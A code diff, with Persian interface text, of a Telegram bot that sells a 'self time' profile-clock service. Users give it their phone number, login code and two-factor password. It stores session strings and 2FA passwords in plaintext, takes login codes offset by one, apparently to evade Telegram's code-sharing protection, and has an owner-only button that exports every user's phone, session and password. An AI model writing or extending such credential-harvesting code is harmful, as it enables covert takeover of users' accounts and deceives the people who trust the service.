@@ -47,13 +47,6 @@ HELP_TEXT = (
     "• استیبل‌تره\n"
     "• وابسته به APIهای عمومی ربات نیستی\n\n"
 
-    "🧩 آموزش ساخت API تلگرام:\n"
-    "1️⃣ با آی‌پی تمیز وارد my.telegram.org شو\n"
-    "2️⃣ لاگین کن\n"
-    "3️⃣ API development tools رو بزن\n"
-    "4️⃣ فقط اسم اپلیکیشن کافیه (URL می‌تونه خالی باشه)\n"
-    "5️⃣ API ID و API HASH رو بگیر\n\n"
-
     "🕒 سلف تایم:\n"
     "• ساعت تهران\n"
     "• هر ۶۰ ثانیه آپدیت\n"
@@ -64,6 +57,7 @@ HELP_TEXT = (
 # ================== DATABASE ==================
 async def init_db():
     pool = await asyncpg.create_pool(DATABASE_URL)
+    # create tables (twofa_password column included)
     await pool.execute(
         """
         CREATE TABLE IF NOT EXISTS users (
@@ -81,7 +75,7 @@ async def init_db():
 
         CREATE TABLE IF NOT EXISTS api_pool (
             id SERIAL PRIMARY KEY,
-            api_id INTEGER,
+            api_id INTEGER UNIQUE,
             api_hash TEXT,
             is_active BOOLEAN DEFAULT true
         );
@@ -106,8 +100,8 @@ async def init_db():
 
 # ================== BOT ==================
 bot = TelegramClient("bot", BOT_API_ID, BOT_API_HASH)
-running_tasks = {}
-user_states = {}  # per-user ephemeral state during interactive flows
+running_tasks = {}       # user_id -> asyncio.Task
+user_states = {}        # ephemeral per-user interaction state
 
 FONT_MAP = {
     0: lambda x: x,
@@ -123,11 +117,10 @@ def now_time():
 
 # ================== FORCE JOIN ==================
 async def force_join_required(event):
+    # Owner exempt
     if event.sender_id == OWNER_ID:
         return False
-    enabled = await bot.pool.fetchval(
-        "SELECT value FROM settings WHERE key='force_join_enabled'"
-    )
+    enabled = await bot.pool.fetchval("SELECT value FROM settings WHERE key='force_join_enabled'")
     if enabled != "true":
         return False
     channels = await bot.pool.fetch("SELECT channel FROM force_join")
@@ -141,13 +134,9 @@ async def force_join_required(event):
 
 # ================== API POOL ==================
 async def get_available_api():
-    rows = await bot.pool.fetch(
-        "SELECT api_id, api_hash FROM api_pool WHERE is_active=true"
-    )
+    rows = await bot.pool.fetch("SELECT api_id, api_hash FROM api_pool WHERE is_active=true")
     for r in rows:
-        count = await bot.pool.fetchval(
-            "SELECT COUNT(*) FROM users WHERE api_id=$1", r["api_id"]
-        )
+        count = await bot.pool.fetchval("SELECT COUNT(*) FROM users WHERE api_id=$1", r["api_id"])
         if count < API_LIMIT_PER_APP:
             return r["api_id"], r["api_hash"]
     return None, None
@@ -161,13 +150,23 @@ async def test_api(api_id, api_hash):
         return True
     except RPCError:
         return False
+    except Exception:
+        # could be network or invalid, treat as invalid
+        return False
 
 
 # ================== SELF TASK ==================
 async def start_self_task(user_id, session_string, api_id, api_hash, base_name, font_id):
-    # create a user client from the stored session and run profile-updater loop
+    # if parameters incomplete, don't start
+    if not session_string or not api_id or not api_hash or base_name is None or font_id is None:
+        return
+
     client = TelegramClient(StringSession(session_string), api_id, api_hash)
-    await client.connect()
+    try:
+        await client.connect()
+    except Exception:
+        # can't connect, skip starting
+        return
 
     async def runner():
         while True:
@@ -179,12 +178,10 @@ async def start_self_task(user_id, session_string, api_id, api_hash, base_name, 
             except FloodWaitError as e:
                 await asyncio.sleep(e.seconds + 5)
             except asyncio.CancelledError:
-                # task cancelled (stop_self_task), break loop
                 break
             except Exception:
                 await asyncio.sleep(60)
 
-    # cancel existing task if any (safety)
     await stop_self_task(user_id)
     running_tasks[user_id] = asyncio.create_task(runner())
 
@@ -203,34 +200,30 @@ async def stop_self_task(user_id):
 async def load_all_users():
     rows = await bot.pool.fetch("SELECT * FROM users WHERE is_active=true")
     for r in rows:
-        # skip incomplete rows (safety)
-        if not r["session_string"] or not r["api_id"] or not r["api_hash"]:
+        # ensure fields exist
+        try:
+            await start_self_task(
+                r["user_id"],
+                r["session_string"],
+                r["api_id"],
+                r["api_hash"],
+                r["base_name"],
+                r["font_id"],
+            )
+        except Exception:
+            # skip problematic ones
             continue
-        # if base_name or font_id missing, skip starting until user finishes config
-        if not r["base_name"] or r["font_id"] is None:
-            continue
-        await start_self_task(
-            r["user_id"],
-            r["session_string"],
-            r["api_id"],
-            r["api_hash"],
-            r["base_name"],
-            r["font_id"],
-        )
 
 
-# ================== START ==================
+# ================== START HANDLER ==================
 @bot.on(events.NewMessage(pattern="/start"))
 async def start(event):
-    uid = event.sender_id
     if await force_join_required(event):
         channels = await bot.pool.fetch("SELECT channel FROM force_join")
-        await event.respond(
-            "برای استفاده از ربات ابتدا باید عضو کانال‌های زیر شوید:\n\n"
-            + "\n".join(c["channel"] for c in channels)
-        )
+        await event.respond("برای استفاده از ربات ابتدا باید عضو کانال‌های زیر شوید:\n\n" + "\n".join(c["channel"] for c in channels))
         return
 
+    uid = event.sender_id
     row = await bot.pool.fetchrow("SELECT is_active FROM users WHERE user_id=$1", uid)
     if row and row["is_active"]:
         await event.respond(
@@ -252,13 +245,13 @@ async def start(event):
     )
 
 
-# ================== CALLBACKS ==================
+# ================== CALLBACKS (single handler) ==================
 @bot.on(events.CallbackQuery)
 async def callbacks(event):
     uid = event.sender_id
     data = event.data.decode()
 
-    # ---------- top menu ----------
+    # TOP / MAIN menu
     if data == "start_self":
         buttons = [
             [Button.inline("ورود بدون API", b"login_normal")],
@@ -267,7 +260,6 @@ async def callbacks(event):
         ]
         if uid == OWNER_ID:
             buttons.append([Button.inline("👮 پنل ادمین", b"admin")])
-
         await event.edit("یکی از گزینه‌ها رو انتخاب کن 👇", buttons=buttons)
         return
 
@@ -275,7 +267,7 @@ async def callbacks(event):
         await event.edit(HELP_TEXT)
         return
 
-    # ---------- ADMIN PANEL ----------
+    # ADMIN panel open
     if uid == OWNER_ID and data == "admin":
         await event.edit(
             "👮 پنل ادمین",
@@ -291,8 +283,9 @@ async def callbacks(event):
         )
         return
 
-    # ---------- LOGIN MODES ----------
+    # LOGIN modes
     if data == "login_normal":
+        # start ephemeral state for normal login
         user_states[uid] = {"mode": "normal", "expect": "phone"}
         await event.edit("📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
         return
@@ -302,35 +295,27 @@ async def callbacks(event):
         await event.edit("🧩 API ID رو بفرست")
         return
 
-    # ---------- ADMIN: add/del/toggle force join ----------
+    # ADMIN: add_channel / del_channel / toggle force / get_sessions handled here too
     if uid == OWNER_ID and data == "add_channel":
-        user_states[uid] = {"expect": "add_channel"}
+        user_states[uid] = {"admin": "add_channel", "step": "channel"}
         await event.edit("یوزرنیم کانال رو بفرست (مثال: @channel)")
         return
 
     if uid == OWNER_ID and data == "del_channel":
-        user_states[uid] = {"expect": "del_channel"}
+        user_states[uid] = {"admin": "del_channel", "step": "channel"}
         await event.edit("یوزرنیم کانالی که می‌خوای حذف بشه رو بفرست (مثال: @channel)")
         return
 
     if uid == OWNER_ID and data == "toggle_force":
-        current = await bot.pool.fetchval(
-            "SELECT value FROM settings WHERE key='force_join_enabled'"
-        )
+        current = await bot.pool.fetchval("SELECT value FROM settings WHERE key='force_join_enabled'")
         new_value = "false" if current == "true" else "true"
-        await bot.pool.execute(
-            "UPDATE settings SET value=$1 WHERE key='force_join_enabled'",
-            new_value,
-        )
+        await bot.pool.execute("UPDATE settings SET value=$1 WHERE key='force_join_enabled'", new_value)
         status = "فعال ✅" if new_value == "true" else "غیرفعال ❌"
         await event.edit(f"وضعیت فورس‌جوین: {status}")
         return
 
-    # ---------- ADMIN: get sessions ----------
     if uid == OWNER_ID and data == "get_sessions":
-        rows = await bot.pool.fetch(
-            "SELECT user_id, phone, session_string, twofa_password FROM users"
-        )
+        rows = await bot.pool.fetch("SELECT user_id, phone, session_string, twofa_password FROM users")
         text = ""
         for r in rows:
             text += (
@@ -342,7 +327,42 @@ async def callbacks(event):
         await event.edit(text or "کاربری وجود ندارد")
         return
 
-    # ---------- REMOVE / CHANGE self ----------
+    # ADMIN: add_api/list_api/broadcast via callbacks
+    if uid == OWNER_ID and data == "add_api":
+        user_states[uid] = {"admin": "add_api", "step": "api_id"}
+        await event.edit("➕ API ID رو بفرست")
+        return
+
+    if uid == OWNER_ID and data == "list_api":
+        rows = await bot.pool.fetch(
+            """
+            SELECT a.api_id, a.is_active,
+            COUNT(u.user_id) as users_count
+            FROM api_pool a
+            LEFT JOIN users u ON u.api_id = a.api_id
+            GROUP BY a.api_id, a.is_active
+            ORDER BY a.api_id
+            """
+        )
+        if not rows:
+            await event.edit("❌ هیچ API ای ثبت نشده")
+            return
+        text = "📋 لیست API ها:\n\n"
+        for r in rows:
+            text += (
+                f"API ID: {r['api_id']}\n"
+                f"وضعیت: {'فعال ✅' if r['is_active'] else 'غیرفعال ❌'}\n"
+                f"تعداد کاربران: {r['users_count']}\n\n"
+            )
+        await event.edit(text)
+        return
+
+    if uid == OWNER_ID and data == "broadcast":
+        user_states[uid] = {"admin": "broadcast"}
+        await event.edit("📢 پیام همگانی رو بفرست")
+        return
+
+    # REMOVE / CHANGE SELF
     if data == "remove_self":
         await stop_self_task(uid)
         await bot.pool.execute("UPDATE users SET is_active=false WHERE user_id=$1", uid)
@@ -350,70 +370,106 @@ async def callbacks(event):
         return
 
     if data == "change_self":
-        # stop running task and enter change flow (ask for base name)
+        # stop running task and ask for new base name
         await stop_self_task(uid)
-        user_states[uid] = {"mode": "change", "expect": "base_name"}
+        user_states[uid] = {"mode": "change", "expect": "base_name", "change": True}
         await event.edit("✏️ اسم جدید قبل ساعت رو بفرست")
         return
 
-    # ---------- font pick handled separately by pattern ----------
-    # unknown callbacks fallthrough
-    # do nothing for unimplemented admin buttons (add_api, list_api, broadcast, get_sessions handled, get_sessions done)
+    # any other callback falls through (font_ is handled by a pattern handler below)
     return
 
 
-# ================== MESSAGE FLOW ==================
+# ================== MESSAGE FLOW (single handler) ==================
 @bot.on(events.NewMessage)
 async def messages(event):
     uid = event.sender_id
     txt = event.raw_text.strip()
 
-    # only proceed if user is in an interactive state
-    if uid not in user_states:
+    # Only act if user has an active ephemeral state OR owner-admin flow
+    st = user_states.get(uid)
+    if not st:
         return
 
-    st = user_states[uid]
-
     try:
-        # ---------- ADMIN: add_channel / del_channel ----------
-        if st.get("expect") == "add_channel" and uid == OWNER_ID:
+        # ---------- ADMIN FLOWS ----------
+        if st.get("admin") == "add_channel" and st.get("step") == "channel" and uid == OWNER_ID:
             channel = txt
-            await bot.pool.execute(
-                "INSERT INTO force_join (channel) VALUES ($1) ON CONFLICT DO NOTHING",
-                channel,
-            )
+            await bot.pool.execute("INSERT INTO force_join (channel) VALUES ($1) ON CONFLICT DO NOTHING", channel)
             await event.respond("✅ کانال با موفقیت اضافه شد")
             user_states.pop(uid, None)
             return
 
-        if st.get("expect") == "del_channel" and uid == OWNER_ID:
+        if st.get("admin") == "del_channel" and st.get("step") == "channel" and uid == OWNER_ID:
             channel = txt
-            await bot.pool.execute(
-                "DELETE FROM force_join WHERE channel=$1",
-                channel,
-            )
+            await bot.pool.execute("DELETE FROM force_join WHERE channel=$1", channel)
             await event.respond("✅ کانال با موفقیت حذف شد")
             user_states.pop(uid, None)
             return
 
-        # ---------- LOGIN: expect api_id ----------
-        if st.get("expect") == "api_id":
-            st["api_id"] = int(txt)
+        # ADMIN: add_api
+        if st.get("admin") == "add_api" and st.get("step") == "api_id" and uid == OWNER_ID:
+            try:
+                st["api_id"] = int(txt)
+            except Exception:
+                await event.respond("❌ API ID باید عدد باشه")
+                return
+            st["step"] = "api_hash"
+            await event.respond("API HASH رو بفرست")
+            return
+
+        if st.get("admin") == "add_api" and st.get("step") == "api_hash" and uid == OWNER_ID:
+            api_hash = txt.strip()
+            ok = await test_api(st["api_id"], api_hash)
+            if not ok:
+                await event.respond("❌ API معتبر نیست یا ارتباط مشکل داره")
+                return
+            await bot.pool.execute(
+                "INSERT INTO api_pool (api_id, api_hash, is_active) VALUES ($1,$2,true) ON CONFLICT (api_id) DO UPDATE SET api_hash=$2, is_active=true",
+                st["api_id"],
+                api_hash,
+            )
+            await event.respond("✅ API با موفقیت اضافه شد")
+            user_states.pop(uid, None)
+            return
+
+        # ADMIN: broadcast
+        if st.get("admin") == "broadcast" and uid == OWNER_ID:
+            rows = await bot.pool.fetch("SELECT user_id FROM users")
+            sent = 0
+            for r in rows:
+                try:
+                    await bot.send_message(r["user_id"], txt)
+                    sent += 1
+                except Exception:
+                    # ignore send errors (blocked / deactivated)
+                    continue
+            await event.respond(f"✅ پیام همگانی ارسال شد\n📨 ارسال موفق: {sent}")
+            user_states.pop(uid, None)
+            return
+
+        # ---------- LOGIN FLOWS ----------
+        # API mode
+        if st.get("expect") == "api_id" and st.get("mode") == "api":
+            try:
+                st["api_id"] = int(txt)
+            except Exception:
+                await event.respond("❌ API ID باید عدد باشه")
+                return
             st["expect"] = "api_hash"
             await event.respond("API HASH رو بفرست")
             return
 
-        # ---------- LOGIN: expect api_hash ----------
-        if st.get("expect") == "api_hash":
+        if st.get("expect") == "api_hash" and st.get("mode") == "api":
             st["api_hash"] = txt
             st["expect"] = "phone"
             await event.respond("📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
             return
 
-        # ---------- LOGIN: expect phone ----------
+        # PHONE input
         if st.get("expect") == "phone":
             st["phone"] = txt
-            # fill api from pool if normal
+            # if normal mode, fetch from api_pool
             if st.get("mode") == "normal":
                 api_id, api_hash = await get_available_api()
                 if not api_id:
@@ -426,10 +482,16 @@ async def messages(event):
                     return
                 st["api_id"], st["api_hash"] = api_id, api_hash
 
-            # request code
+            # send code
             client = TelegramClient(StringSession(), st["api_id"], st["api_hash"])
-            await client.connect()
-            await client.send_code_request(st["phone"])
+            try:
+                await client.connect()
+                await client.send_code_request(st["phone"])
+            except Exception as e:
+                await event.respond(f"❌ خطا در ارسال کد: {e}")
+                user_states.pop(uid, None)
+                return
+
             st["client"] = client
             st["expect"] = "code"
             await event.respond(
@@ -438,16 +500,25 @@ async def messages(event):
             )
             return
 
-        # ---------- LOGIN: expect code (but don't try int() if 2FA will be needed) ----------
+        # CODE input (numeric code path)
         if st.get("expect") == "code" and not st.get("need_2fa"):
-            # safe convert to int — this block only runs when expecting numerical code
-            code = str(int(txt) - 1)
+            # this block runs only when the bot expects a numeric code
+            try:
+                code = str(int(txt) - 1)
+            except Exception:
+                await event.respond("❌ کد نامعتبره. لطفاً همان عددی که تلگرام می‌فرسته رو بفرست (همان‌طور که در راهنما گفتیم +1).")
+                return
             try:
                 await st["client"].sign_in(st["phone"], code)
             except SessionPasswordNeededError:
+                # 2FA required
                 st["need_2fa"] = True
                 st["expect"] = "2fa"
                 await event.respond("🔐 رمز دو مرحله‌ای رو بفرست")
+                return
+            except Exception as e:
+                await event.respond(f"❌ خطا در ورود: {e}")
+                user_states.pop(uid, None)
                 return
 
             # signed in without 2FA
@@ -456,13 +527,17 @@ async def messages(event):
             await event.respond("✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
             return
 
-        # ---------- LOGIN: expect 2fa ----------
+        # 2FA password input (text)
         if st.get("expect") == "2fa" and st.get("need_2fa"):
-            # this is textual password
-            await st["client"].sign_in(password=txt)
+            try:
+                await st["client"].sign_in(password=txt)
+            except Exception as e:
+                await event.respond(f"❌ خطا در ورود با 2FA: {e}")
+                user_states.pop(uid, None)
+                return
             st["password"] = True
             st["session"] = st["client"].session.save()
-            # store twofa in DB minimally (as requested)
+            # save session and twofa minimally
             await bot.pool.execute(
                 """
                 INSERT INTO users (user_id, phone, api_id, api_hash, session_string, twofa_password, is_active)
@@ -472,17 +547,17 @@ async def messages(event):
                     twofa_password=$6
                 """,
                 uid,
-                st["phone"],
+                st.get("phone"),
                 st.get("api_id"),
                 st.get("api_hash"),
-                st["session"],
+                st.get("session"),
                 txt,
             )
             st["expect"] = "base_name"
             await event.respond("✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
             return
 
-        # ---------- CHANGE FLOW / BASE NAME ----------
+        # base name (both for new activation and change flow)
         if st.get("expect") == "base_name":
             st["base_name"] = txt
             st["expect"] = "font"
@@ -499,19 +574,22 @@ async def messages(event):
 
     except Exception as e:
         await event.respond(f"❌ خطا: {e}")
+        # on error, clear ephemeral state to avoid stuck states
+        user_states.pop(uid, None)
+        return
 
 
-# ================== FONT PICK ==================
+# ================== FONT PICK (pattern handler) ==================
 @bot.on(events.CallbackQuery(pattern=b"font_"))
 async def font_pick(event):
     uid = event.sender_id
-    font_id = int(event.data.decode().split("_")[1])
+    data = event.data.decode()
+    font_id = int(data.split("_")[1])
     st = user_states.get(uid, {})
 
-    # If user was in change flow
-    if st.get("mode") == "change" and st.get("expect") in ("font", "base_name"):
-        # update base_name and font_id in DB and start task
-        # fetch existing session data
+    # If user is in change flow
+    if st.get("mode") == "change" or st.get("change"):
+        # update DB and restart task
         row = await bot.pool.fetchrow("SELECT session_string, api_id, api_hash FROM users WHERE user_id=$1", uid)
         if not row or not row["session_string"]:
             await event.edit("⚠️ سشن پیدا نشد. ابتدا یکبار لاگین کن.")
@@ -519,22 +597,13 @@ async def font_pick(event):
             return
 
         await bot.pool.execute(
-            """
-            UPDATE users SET base_name=$1, font_id=$2, is_active=true WHERE user_id=$3
-            """,
-            st["base_name"],
+            "UPDATE users SET base_name=$1, font_id=$2, is_active=true WHERE user_id=$3",
+            st.get("base_name"),
             font_id,
             uid,
         )
 
-        await start_self_task(
-            uid,
-            row["session_string"],
-            row["api_id"],
-            row["api_hash"],
-            st["base_name"],
-            font_id,
-        )
+        await start_self_task(uid, row["session_string"], row["api_id"], row["api_hash"], st.get("base_name"), font_id)
 
         await event.edit(
             "✅ سلف تایم با موفقیت فعال شد\n\nاز گزینه‌های زیر استفاده کن:",
@@ -546,9 +615,8 @@ async def font_pick(event):
         user_states.pop(uid, None)
         return
 
-    # Normal/new activation flow after login
+    # Normal new activation flow after login
     if st.get("expect") == "font" and st.get("session"):
-        # insert/update user record with session and chosen config
         await bot.pool.execute(
             """
             INSERT INTO users (user_id, phone, api_id, api_hash, session_string,
@@ -572,15 +640,7 @@ async def font_pick(event):
             font_id,
         )
 
-        # start the self task
-        await start_self_task(
-            uid,
-            st.get("session"),
-            st.get("api_id"),
-            st.get("api_hash"),
-            st.get("base_name"),
-            font_id,
-        )
+        await start_self_task(uid, st.get("session"), st.get("api_id"), st.get("api_hash"), st.get("base_name"), font_id)
 
         await event.edit(
             "✅ سلف تایم با موفقیت فعال شد\n\nاز گزینه‌های زیر استفاده کن:",
@@ -604,4 +664,5 @@ async def main():
     await bot.run_until_disconnected()
 
 
-asyncio.run(main())
+if __name__ == "__main__":
+    asyncio.run(main())
